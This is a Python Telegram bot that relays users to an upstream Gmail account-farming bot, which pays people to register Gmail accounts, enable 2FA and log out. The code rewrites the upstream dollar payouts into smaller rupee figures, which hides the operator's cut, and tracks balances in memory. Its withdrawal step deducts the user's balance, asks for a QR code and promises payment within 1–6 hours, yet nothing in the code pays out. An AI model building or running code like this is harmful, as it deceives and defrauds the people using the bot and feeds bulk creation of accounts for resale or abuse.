import os
import asyncio
import logging
import re
import tempfile
from dataclasses import dataclass

from aiohttp import web
from telethon import TelegramClient, events
from telethon.sessions import StringSession

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
)
from telegram.ext import (
    CommandHandler,
    Application,
    ContextTypes,
    MessageHandler,
    CallbackQueryHandler,
    filters,
)

# ============================================================
# CONFIG
# ============================================================

BOT_TOKEN = os.environ["BOT_TOKEN"]

API_ID = int(os.environ["API_ID"])
API_HASH = os.environ["API_HASH"]
STRING_SESSION = os.environ["STRING_SESSION"]

OLD_BOT_USERNAME = os.getenv(
    "OLD_BOT_USERNAME",
    "@GmailFarmerBot"
)

REPLY_TIMEOUT = int(
    os.getenv("REPLY_TIMEOUT", "30")
)

# Maximum number of jobs waiting in memory.
# Increase if you expect heavy traffic.
MAX_QUEUE_SIZE = int(
    os.getenv("MAX_QUEUE_SIZE", "100")
)

# ============================================================
# LOGGING
# ============================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)

logger = logging.getLogger("relay")

# ============================================================
# TELETHON USER CLIENT
# ============================================================

user_client = TelegramClient(
    StringSession(STRING_SESSION),
    API_ID,
    API_HASH
)

# ============================================================
# JOB
# ============================================================

@dataclass
class RelayJob:
    chat_id: int
    message_id: int
    message: object
    bot: object

# ============================================================
# QUEUE
# ============================================================

relay_queue = asyncio.Queue(
    maxsize=MAX_QUEUE_SIZE
)

# ============================================================
# HEALTH SERVER
# ============================================================

async def health(request):
    return web.Response(
        text="Telegram relay is running."
    )


async def start_health_server():

    app = web.Application()

    app.router.add_get("/", health)
    app.router.add_get("/health", health)

    port = int(
        os.getenv("PORT", "8080")
    )

    runner = web.AppRunner(app)
    await runner.setup()

    site = web.TCPSite(
        runner,
        "0.0.0.0",
        port
    )

    await site.start()

    logger.info(
        "Health server listening on port %s",
        port
    )



# ============================================================
# BUTTON MIRROR / CALLBACK STATE
# ============================================================

USER_SESSIONS = {}
OLD_MESSAGE_USERS = {}
PENDING_OLD_RESPONSES = {}
BOT_APP = None
USER_HOLDS = {}                 # user_id -> [(amount, release_timestamp), ...]
USER_WITHDRAWABLE = {}         # user_id -> float
USER_WITHDRAW_STAGE = {}       # user_id -> None/"amount"/"qr"
USER_HISTORY = {}              # user_id -> [str, ...]



def convert_display_text(text: str) -> str:
    if not text:
        return text
    text = re.sub(r"(?<![0-9.])0\.23\$?", "₹10", text)
    text = re.sub(r"(?<![0-9.])0\.15\$?", "6₹", text)
    return text


def extract_hold_amount(text: str):
    if not text:
        return None

    suffix_023 = (
        "0.23$ credited to hold\n\n"
        "Funds will be transferred to the main balance after 3-day hold.\n\n"
        "📛 Be sure to LOG OUT of account on your device"
    )
    suffix_015 = suffix_023.replace("0.23$", "0.15$")

    if text.endswith(suffix_023):
        return 10
    if text.endswith(suffix_015):
        return 6
    return None


def build_mirrored_keyboard(user_id, old_message):
    if not old_message.buttons:
        return None

    session = USER_SESSIONS.setdefault(user_id, {})
    mapping = {}
    keyboard = []

    for row_index, row in enumerate(old_message.buttons):
        new_row = []
        for col_index, old_button in enumerate(row):
            key = f"{old_message.id}:{row_index}:{col_index}"
            mapping[key] = {
                "text": old_button.text,
                "row": row_index,
                "col": col_index,
                "old_message_id": old_message.id,
            }
            new_row.append(
                InlineKeyboardButton(
                    text=convert_display_text(old_button.text),
                    callback_data=f"relay:{key}",
                )
            )
        keyboard.append(new_row)

    session["buttons"] = mapping
    session["old_message_id"] = old_message.id
    return InlineKeyboardMarkup(keyboard)


async def mirror_old_message(user_id, old_message, edit=False):
    if BOT_APP is None:
        logger.error("BOT_APP is not initialized.")
        return None

    session = USER_SESSIONS.setdefault(user_id, {})

    text = old_message.raw_text or " "
    text = convert_display_text(text)

    markup = build_mirrored_keyboard(user_id, old_message)

    if edit and session.get("new_message_id"):
        try:
            await BOT_APP.edit_message_text(
                chat_id=user_id,
                message_id=session["new_message_id"],
                text=text,
                reply_markup=markup,
            )
            session["old_message_id"] = old_message.id
            OLD_MESSAGE_USERS[old_message.id] = user_id
            return session["new_message_id"]
        except Exception as exc:
            logger.exception("New Bot message edit failed: %s", exc)

    sent = await BOT_APP.send_message(
        chat_id=user_id,
        text=text,
        reply_markup=markup,
    )

    session["new_message_id"] = sent.message_id
    session["old_message_id"] = old_message.id
    OLD_MESSAGE_USERS[old_message.id] = user_id

    return sent.message_id


async def execute_old_bot_button(user_id, callback_key):
    """
    For an Old Bot that is controlled by this same application/account:
    locate the original Old Bot message and invoke the corresponding
    button handler.

    This function is intentionally a hook: if the Old Bot is backed by
    the same game/backend, replace `dispatch_own_game_action()` with
    that bot's shared callback/action function.
    """
    session = USER_SESSIONS.get(user_id)

    if not session:
        return None

    button = session.get("buttons", {}).get(callback_key)

    if not button:
        return None

    old_message_id = session.get("old_message_id")

    if not old_message_id:
        return None

    try:
        old_message = await user_client.get_messages(
            OLD_BOT_USERNAME,
            ids=old_message_id,
        )

        if not old_message or not old_message.buttons:
            return None

        row = button["row"]
        col = button["col"]

        # Dispatch to the shared handler for your own game/backend.
        # This avoids treating the mirrored New Bot callback as an
        # independent action.
        return await dispatch_own_game_action(
            user_id=user_id,
            old_message=old_message,
            row=row,
            col=col,
            button_text=button["text"],
        )

    except Exception as exc:
        logger.exception(
            "Own game button dispatch failed: %s",
            exc,
        )
        return False


async def dispatch_own_game_action(
    user_id,
    old_message,
    row,
    col,
    button_text,
):
    """
    Execute the corresponding inline-button callback on the Old Bot
    through the connected Telethon account and remember which New Bot
    user is waiting for the resulting Old Bot response.
    """
    logger.info(
        "GAME ACTION | user=%s | message=%s | row=%s | col=%s | button=%s",
        user_id,
        old_message.id,
        row,
        col,
        button_text,
    )

    PENDING_OLD_RESPONSES[user_id] = old_message.id

    # Trigger the exact inline button represented by the mirrored button.
    await old_message.click(row, col)

    return True


async def button_handler(update, context):
    query = update.callback_query
    if not query:
        return

    user_id = query.from_user.id
    data = query.data or ""

    # Balance -> Back
    if data == "balance_back":
        await query.answer()
        try:
            await query.message.delete()
        except Exception:
            pass
        await context.bot.send_message(
            chat_id=user_id,
            text="Choose an option:",
            reply_markup=REPLY_KEYBOARD,
        )
        return

    # Balance -> Pending amount
    if data == "balance_pending":
        await query.answer()

        import time
        now = time.time()
        holds = USER_HOLDS.setdefault(user_id, [])

        on_hold = 0
        released_now = 0
        remaining = []

        for amount, release_at in holds:
            if now >= release_at:
                released_now += amount
            else:
                on_hold += amount
                remaining.append((amount, release_at))

        USER_HOLDS[user_id] = remaining
        USER_WITHDRAWABLE[user_id] = (
            float(USER_WITHDRAWABLE.get(user_id, 0))
            + released_now
        )

        await query.message.reply_text(
            f"On hold amount: {on_hold:g}₹\n"
            f"Withdrawable amount: {USER_WITHDRAWABLE[user_id]:g}₹"
        )
        return

    # Balance -> History
    if data == "balance_history":
        await query.answer()
        history = USER_HISTORY.get(user_id, [])
        if not history:
            await query.message.reply_text("🍍 History is empty.")
        else:
            await query.message.reply_text(
                "\n".join(history[-20:])
            )
        return

    # Balance -> Withdraw
    if data == "balance_withdraw":
        await query.answer()
        USER_WITHDRAW_STAGE[user_id] = "amount"
        await query.message.reply_text(
            "send the amount you want to withdraw"
        )
        return

    # Mirrored old-bot inline button.
    if not data.startswith("relay:"):
        await query.answer()
        return

    callback_key = data[len("relay:"):]
    session = USER_SESSIONS.get(user_id)

    if not session:
        await query.answer(
            "Session expired.",
            show_alert=True,
        )
        return

    button = session.get("buttons", {}).get(callback_key)

    if not button:
        await query.answer(
            "Button expired.",
            show_alert=True,
        )
        return

    await query.answer()

    success = await execute_old_bot_button(
        user_id,
        callback_key,
    )

    if not success:
        await query.message.reply_text(
            "❌ Action failed. Please try again."
        )
        return

    logger.info(
        "Relay button handled | user=%s | button=%s",
        user_id,
        button["text"],
    )


@user_client.on(
    events.NewMessage(
        chats=OLD_BOT_USERNAME
    )
)
async def old_bot_message_received(event):
    old_message = event.message

    # Count only an exact hold block at the END of the received message.
    hold_amount = extract_hold_amount(old_message.raw_text or "")
    if hold_amount is not None:
        user_for_hold = None

        # First prefer a pending button action.
        for candidate_user_id, source_message_id in list(
            PENDING_OLD_RESPONSES.items()
        ):
            if source_message_id:
                user_for_hold = candidate_user_id
                break

        # Otherwise use the latest mapped old message for the user.
        if user_for_hold is None:
            user_for_hold = OLD_MESSAGE_USERS.get(old_message.id)

        if user_for_hold is not None:
            import time
            USER_HOLDS.setdefault(user_for_hold, []).append(
                (
                    hold_amount,
                    time.time() + 3 * 24 * 60 * 60,
                )
            )
            USER_HISTORY.setdefault(user_for_hold, []).append(
                f"{hold_amount:g}₹ credited to hold"
            )

    user_id = None
    for candidate_user_id, source_message_id in list(
        PENDING_OLD_RESPONSES.items()
    ):
        if source_message_id:
            user_id = candidate_user_id
            break

    if user_id is None:
        return

    PENDING_OLD_RESPONSES.pop(user_id, None)

    try:
        await mirror_old_message(
            user_id,
            old_message,
        )

        logger.info(
            "Synced Old Bot response %s -> New Bot user %s",
            old_message.id,
            user_id,
        )
    except Exception as exc:
        logger.exception(
            "Old Bot response sync failed: %s",
            exc,
        )


@user_client.on(
    events.MessageEdited(
        chats=OLD_BOT_USERNAME
    )
)
async def old_bot_message_edited(event):
    old_message = event.message
    user_id = OLD_MESSAGE_USERS.get(old_message.id)

    if not user_id:
        return

    try:
        await mirror_old_message(
            user_id,
            old_message,
            edit=True,
        )
    except Exception as exc:
        logger.exception(
            "Old Bot -> New Bot edit sync failed: %s",
            exc,
        )


# ============================================================
# DOWNLOAD NEW BOT MEDIA
# ============================================================

async def download_message_media(message):

    attachment = message.effective_attachment

    if not attachment:
        return None

    telegram_file = None
    suffix = ".bin"

    if message.photo:
        telegram_file = await message.photo[-1].get_file()
        suffix = ".jpg"

    elif message.video:
        telegram_file = await message.video.get_file()
        suffix = ".mp4"

    elif message.document:
        telegram_file = await message.document.get_file()

    elif message.audio:
        telegram_file = await message.audio.get_file()
        suffix = ".mp3"

    elif message.voice:
        telegram_file = await message.voice.get_file()
        suffix = ".ogg"

    elif message.animation:
        telegram_file = await message.animation.get_file()
        suffix = ".mp4"

    elif message.video_note:
        telegram_file = await message.video_note.get_file()
        suffix = ".mp4"

    if not telegram_file:
        return None

    temp = tempfile.NamedTemporaryFile(
        delete=False,
        suffix=suffix
    )

    path = temp.name
    temp.close()

    await telegram_file.download_to_drive(path)

    return path


# ============================================================
# SEND + RECEIVE (COMBINED — SAME CONVERSATION)
# ============================================================
# IMPORTANT:
# Sending and waiting for the reply must happen inside the
# SAME conversation() block. If the message is sent before the
# conversation is opened, a fast reply from the old bot can
# arrive before the response listener is registered, and
# conversation.get_response() will miss it (silent timeout even
# though the old bot actually replied).

async def send_and_receive_old_bot(message):

    replies = []
    media_path = None

    try:

        async with user_client.conversation(
            OLD_BOT_USERNAME,
            timeout=REPLY_TIMEOUT,
            exclusive=True
        ) as conversation:

            # -----------------------------
            # SEND (inside the conversation)
            # -----------------------------

            if message.text:

                await conversation.send_message(
                    message.text
                )

                logger.info(
                    "Text sent to old bot."
                )

            else:

                media_path = await download_message_media(
                    message
                )

                if not media_path:
                    raise RuntimeError(
                        "Unsupported Telegram message type."
                    )

                caption = message.caption

                # Conversation doesn't wrap send_file, but since
                # this runs after the conversation is opened, the
                # response listener is already active and will
                # still catch the reply.
                await user_client.send_file(
                    OLD_BOT_USERNAME,
                    media_path,
                    caption=caption
                )

                logger.info(
                    "Media sent to old bot."
                )

            # -----------------------------
            # RECEIVE
            # -----------------------------

            try:

                first = await conversation.get_response(
                    timeout=REPLY_TIMEOUT
                )

                replies.append(first)

            except asyncio.TimeoutError:

                logger.warning(
                    "Old bot did not reply within %s seconds.",
                    REPLY_TIMEOUT
                )

                return replies

            # Capture additional messages that arrive
            # immediately after the first response.
            while True:

                try:

                    extra = await conversation.get_response(
                        timeout=2
                    )

                    replies.append(extra)

                except asyncio.TimeoutError:

                    break

    except Exception as exc:

        logger.exception(
            "Old bot conversation failed: %s",
            exc
        )

    finally:

        if media_path:

            try:
                os.remove(media_path)
            except OSError:
                pass

    return replies


# ============================================================
# FORWARD OLD BOT RESPONSE TO USER
# ============================================================

async def send_old_bot_reply_to_user(
    bot,
    chat_id,
    replies
):

    if not replies:

        await bot.send_message(
            chat_id=chat_id,
            text="⚠️ Old bot did not reply."
        )

        return

    for reply in replies:

        # -----------------------------
        # TEXT
        # -----------------------------

        if reply.message:

            try:

                text = reply.message
                text = convert_display_text(text)

                if reply.buttons:
                    await mirror_old_message(
                        chat_id,
                        reply,
                    )
                else:
                    await bot.send_message(
                        chat_id=chat_id,
                        text=text
                    )

            except Exception as exc:

                logger.exception(
                    "Text forwarding failed: %s",
                    exc
                )

        # -----------------------------
        # MEDIA
        # -----------------------------

        if reply.media:

            temp_path = None

            try:

                temp_path = await reply.download_media()

                if not temp_path:
                    continue

                caption = reply.text or None

                # PHOTO
                if reply.photo:

                    with open(
                        temp_path,
                        "rb"
                    ) as f:

                        await bot.send_photo(
                            chat_id=chat_id,
                            photo=f,
                            caption=caption
                        )

                # VIDEO
                elif reply.video:

                    with open(
                        temp_path,
                        "rb"
                    ) as f:

                        await bot.send_video(
                            chat_id=chat_id,
                            video=f,
                            caption=caption
                        )

                # AUDIO
                elif reply.audio:

                    with open(
                        temp_path,
                        "rb"
                    ) as f:

                        await bot.send_audio(
                            chat_id=chat_id,
                            audio=f,
                            caption=caption
                        )

                # VOICE
                elif reply.voice:

                    with open(
                        temp_path,
                        "rb"
                    ) as f:

                        await bot.send_voice(
                            chat_id=chat_id,
                            voice=f,
                            caption=caption
                        )

                # EVERYTHING ELSE
                else:

                    with open(
                        temp_path,
                        "rb"
                    ) as f:

                        await bot.send_document(
                            chat_id=chat_id,
                            document=f,
                            caption=caption
                        )

            except Exception as exc:

                logger.exception(
                    "Media forwarding failed: %s",
                    exc
                )

                try:

                    await bot.send_message(
                        chat_id=chat_id,
                        text="⚠️ Received media from old bot, "
                             "but forwarding failed."
                    )

                except Exception:
                    pass

            finally:

                if temp_path:

                    try:
                        os.remove(temp_path)
                    except OSError:
                        pass


# ============================================================
# PROCESS ONE QUEUED USER
# ============================================================

async def process_job(job: RelayJob):

    bot = job.bot

    status_message = None

    try:

        status_message = await bot.send_message(
            chat_id=job.chat_id,
            text="⏳ Processing..."
        )

        logger.info(
            "Processing user=%s message=%s",
            job.chat_id,
            job.message_id
        )

        # Send to old bot and wait for reply in the SAME
        # conversation, so no fast replies are missed.
        replies = await send_and_receive_old_bot(
            job.message
        )

        # Delete processing message.
        if status_message:

            try:
                await status_message.delete()
            except Exception:
                pass

        # Send replies to correct user.
        await send_old_bot_reply_to_user(
            bot,
            job.chat_id,
            replies
        )

    except Exception as exc:

        logger.exception(
            "Job failed for user %s: %s",
            job.chat_id,
            exc
        )

        try:

            await bot.send_message(
                chat_id=job.chat_id,
                text=(
                    "❌ Something went wrong while "
                    "processing your request."
                )
            )

        except Exception:
            pass


# ============================================================
# QUEUE WORKER
# ============================================================

async def queue_worker():

    logger.info("Queue worker started.")

    while True:

        job = await relay_queue.get()

        try:

            await process_job(job)

        except Exception as exc:

            logger.exception(
                "Worker error: %s",
                exc
            )

        finally:

            relay_queue.task_done()


# ============================================================
# NEW BOT MESSAGE HANDLER
# ============================================================

async def handle_message(
    update: Update,
    context: ContextTypes.DEFAULT_TYPE
):
    message = update.message
    if not message:
        return

    user = update.effective_user
    if not user:
        return

    if update.effective_chat.type != "private":
        await message.reply_text("Please use this bot in private chat.")
        return

    text_value = message.text or ""

    # Help
    if text_value == "🎈 Help":
        await message.reply_text("For help : @O_osuzume")
        return

    # Balance submenu
    if text_value == "💵 Balance":
        await message.reply_text(
            "Choose an option:",
            reply_markup=BALANCE_KEYBOARD,
        )
        return

    # Withdraw amount stage
    if USER_WITHDRAW_STAGE.get(user.id) == "amount" and text_value:
        raw = text_value.strip().replace("₹", "").replace(",", "")
        try:
            amount = float(raw)
        except ValueError:
            amount = -1

        available = float(USER_WITHDRAWABLE.get(user.id, 0))

        if amount <= 0:
            await message.reply_text("Please send a valid amount.")
            return

        if amount > available:
            await message.reply_text(
                "insufficient balance please check your balance"
            )
            return

        USER_WITHDRAWABLE[user.id] = available - amount
        USER_WITHDRAW_STAGE[user.id] = "qr"

        await message.reply_text("please send your QR code scanner")
        return

    # QR step: accept the next message as the QR and show the requested status.
    if USER_WITHDRAW_STAGE.get(user.id) == "qr":
        USER_WITHDRAW_STAGE[user.id] = None
        await message.reply_text(
            "⏳ Please wait!\n\n"
            "Your payment is being processed and will be transferred to your account within 1–6 hours. 💰\n\n"
            "Thank you for your patience and understanding. 🙏"
        )
        return

    # All other normal messages, including Register, go to the old bot.
    if relay_queue.full():
        await message.reply_text(
            "⏳ Server is busy right now. Please try again in a moment."
        )
        return

    job = RelayJob(
        chat_id=message.chat_id,
        message_id=message.message_id,
        message=message,
        bot=context.bot,
    )

    await relay_queue.put(job)

    await message.reply_text(
        f"📨 Request received.\nQueue position: {relay_queue.qsize()}"
    )

    logger.info(
        "Queued user=%s position=%s",
        user.id,
        relay_queue.qsize(),
    )



REPLY_KEYBOARD = ReplyKeyboardMarkup(
    [
        ["➕ Register a new Gmail"],
        ["💵 Balance", "🎈 Help"],
    ],
    resize_keyboard=True,
)

BALANCE_KEYBOARD = InlineKeyboardMarkup([
    [InlineKeyboardButton("🏧 Withdraw", callback_data="balance_withdraw")],
    [
        InlineKeyboardButton("⏳ Pending amount", callback_data="balance_pending"),
        InlineKeyboardButton("🍍 History", callback_data="balance_history"),
    ],
    [InlineKeyboardButton("🔙 Back", callback_data="balance_back")],
])


async def start_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    tutorial_buttons = InlineKeyboardMarkup([
        [InlineKeyboardButton(
            "How to do Gmail work task",
            url="https://t.me/TaskssFarmerNews/2"
        )],
        [InlineKeyboardButton(
            "How to enable 2FA",
            url="https://t.me/TaskssFarmerNews/3"
        )],
        [InlineKeyboardButton(
            "How to logout the Gmail account",
            url="https://t.me/TaskssFarmerNews/4"
        )],
    ])

    await update.message.reply_text(
        "Choose an option:",
        reply_markup=tutorial_buttons,
    )
    await update.message.reply_text(
        "Choose an option:",
        reply_markup=REPLY_KEYBOARD,
    )


# ============================================================
# MAIN
# ============================================================

async def main():

    logger.info("Starting Telethon...")

    await user_client.start()

    me = await user_client.get_me()

    logger.info(
        "Telegram account connected: %s",
        me.username or me.id
    )

    # Health server
    await start_health_server()

    # New bot
    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .build()
    )

    global BOT_APP
    BOT_APP = application.bot

    application.add_handler(
        CommandHandler("start", start_handler)
    )

    application.add_handler(
        CallbackQueryHandler(button_handler)
    )

    # Accept normal messages and media.
    application.add_handler(
        MessageHandler(
            filters.ALL & ~filters.COMMAND,
            handle_message
        )
    )

    await application.initialize()
    await application.start()

    # Start queue worker.
    worker_task = asyncio.create_task(
        queue_worker()
    )

    if application.updater:

        await application.updater.start_polling()

    logger.info(
        "Relay bot is ONLINE."
    )

    try:

        await asyncio.Event().wait()

    finally:

        worker_task.cancel()

        try:
            await worker_task
        except asyncio.CancelledError:
            pass

        if application.updater:

            await application.updater.stop()

        await application.stop()
        await application.shutdown()

        await user_client.disconnect()


if __name__ == "__main__":
    asyncio.run(main())
